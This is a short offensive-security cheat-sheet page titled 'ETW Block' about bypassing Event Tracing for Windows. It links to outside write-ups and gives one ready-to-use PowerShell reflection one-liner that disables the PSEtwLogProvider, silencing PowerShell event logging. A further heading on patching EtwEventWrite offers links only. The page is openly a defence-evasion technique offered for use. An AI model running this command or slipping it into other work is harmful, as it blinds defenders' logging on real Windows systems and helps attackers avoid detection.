---
description: Bypass Event Tracing for Windows
---

# ETW Block

* ​[https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw](https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw)​

### Disable PSEtwLogProvider <a href="#disable-psetwlogprovider" id="disable-psetwlogprovider"></a>

* ​[https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)​

\[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m\_enabled','NonPublic,Instance').SetValue(\[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

### Patch EtwEventWrite <a href="#patch-etweventwrite" id="patch-etweventwrite"></a>

* ​[https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)​
* ​[https://github.com/Flangvik/NetLoader/blob/master/Source/Program.cs#L241-L258](https://github.com/Flangvik/NetLoader/blob/master/Source/Program.cs#L241-L258)
